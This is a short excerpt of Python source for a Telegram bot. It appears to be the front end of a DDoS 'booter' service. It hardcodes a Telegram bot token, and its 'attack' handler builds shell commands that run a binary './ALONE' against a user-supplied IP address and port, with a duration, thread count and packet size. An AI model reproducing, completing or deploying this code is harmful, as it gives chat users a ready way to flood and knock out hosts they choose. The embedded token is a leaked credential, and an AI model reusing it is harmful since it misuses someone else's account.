...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7598126124:AAE-VST-rleCjIfUhnU_iV2-N9x17HpFOn8'
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./ALONE {ip} {port} {duration} 1200"
    elif argument_type == 4:
        attack_command = f"./ALONE {ip} {port} {duration} {threads} 1200"
    elif argument_type == 5:
        attack_command = f"./ALONE {ip} {port} {duration} {byte_size} {threads} 1200"
